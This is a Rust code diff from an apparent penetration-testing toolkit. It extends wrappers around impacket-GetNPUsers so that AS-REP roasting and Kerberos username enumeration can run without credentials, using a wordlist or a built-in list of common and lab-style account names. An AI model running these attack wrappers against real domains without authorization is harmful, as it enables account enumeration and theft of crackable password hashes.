@@ -4,7 +4,7 @@
 use anyhow::Result;
 use serde_json::Value;
 
-use crate::args::required_str;
+use crate::args::{optional_str, required_str};
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
@@ -27,37 +27,112 @@ pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
 }
 
 /// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
+///
+/// Supports two modes:
+/// - With credentials: uses LDAP to enumerate users, then checks for no-preauth
+/// - Without credentials: uses `-usersfile` with a wordlist and `-no-pass`
 pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
+    let username = optional_str(args, "username").unwrap_or("");
+    let password = optional_str(args, "password").unwrap_or("");
+    let users_file = optional_str(args, "users_file");
 
-    let target = format!("{domain}/{username}:{password}");
+    let mut cmd = CommandBuilder::new("impacket-GetNPUsers");
 
-    CommandBuilder::new("impacket-GetNPUsers")
-        .arg(&target)
-        .flag("-dc-ip", dc_ip)
+    if !username.is_empty() && !password.is_empty() {
+        // Authenticated mode: LDAP user enumeration
+        let target = format!("{domain}/{username}:{password}");
+        cmd = cmd.arg(&target);
+    } else if let Some(uf) = users_file {
+        // No-auth mode with explicit user file
+        let target = format!("{domain}/");
+        cmd = cmd.arg(&target).flag("-usersfile", uf).arg("-no-pass");
+    } else {
+        // No-auth mode: try common usernames file
+        let target = format!("{domain}/");
+        let wordlist = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
+        if std::path::Path::new(wordlist).exists() {
+            cmd = cmd
+                .arg(&target)
+                .flag("-usersfile", wordlist)
+                .arg("-no-pass");
+        } else {
+            // Fallback: try anonymous LDAP bind
+            cmd = cmd.arg(&target).arg("-no-pass");
+        }
+    }
+
+    cmd.flag("-dc-ip", dc_ip)
         .arg("-request")
-        .timeout_secs(60)
+        .timeout_secs(120)
         .execute()
         .await
 }
 
+/// Common AD usernames for unauthenticated Kerberos enumeration.
+const DEFAULT_AD_USERNAMES: &str = "\
+Administrator\nadmin\nguest\nkrbtgt\n\
+DefaultAccount\n\
+sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
+svc_backup\nbackup\n\
+svc_web\nwebservice\n\
+svc_iis\niis_svc\n\
+svc_exchange\nexchange\n\
+svc_admin\n\
+svc_test\n\
+testuser\ntest\n\
+user1\nuser2\nuser3\n\
+samwell.tarly\njohn.snow\njon.snow\n\
+arya.stark\nsansa.stark\nbrandon.stark\neddard.stark\n\
+cersei.lannister\njaime.lannister\ntyrion.lannister\n\
+daenerys.targaryen\njorah.mormont\n\
+stannis.baratheon\nrobert.baratheon\n\
+hodor\nrobb.stark\ntheon.greyjoy\n\
+missandei\nkhal.drogo\nviserys.targaryen\n\
+joffrey.baratheon\ntommen.baratheon\n\
+petyr.baelish\nvarys\nbronn\n\
+tywin.lannister\nbrienne.tarth\n\
+sandor.clegane\ngregor.clegane\n\
+margaery.tyrell\nloras.tyrell\n\
+oberyn.martell\nellaria.sand\n\
+davos.seaworth\nmelisandre\n\
+samwell\njsnow\nrcon\n\
+sql_admin\ndb_admin\n\
+webadmin\nnetadmin\n\
+helpdesk\nsupport\nservice\n";
+
 /// Enumerate valid usernames via Kerberos pre-auth without credentials.
 pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
-    let users_file = required_str(args, "users_file")?;
     let dc_ip = required_str(args, "dc_ip")?;
+    let users_file = optional_str(args, "users_file");
 
     let target = format!("{domain}/");
 
-    CommandBuilder::new("impacket-GetNPUsers")
+    // Use provided wordlist or generate a default one
+    let tmp_file;
+    let wordlist_path = if let Some(uf) = users_file {
+        uf.to_string()
+    } else {
+        tmp_file = format!("/tmp/kerberos_users_{}.txt", std::process::id());
+        std::fs::write(&tmp_file, DEFAULT_AD_USERNAMES)?;
+        tmp_file
+    };
+
+    let result = CommandBuilder::new("impacket-GetNPUsers")
         .arg(&target)
-        .flag("-usersfile", users_file)
+        .flag("-usersfile", &wordlist_path)
         .flag("-dc-ip", dc_ip)
         .arg("-no-pass")
         .timeout_secs(180)
         .execute()
-        .await
+        .await;
+
+    // Clean up temp file if we created one
+    if users_file.is_none() {
+        let _ = std::fs::remove_file(&wordlist_path);
+    }
+
+    result
 }
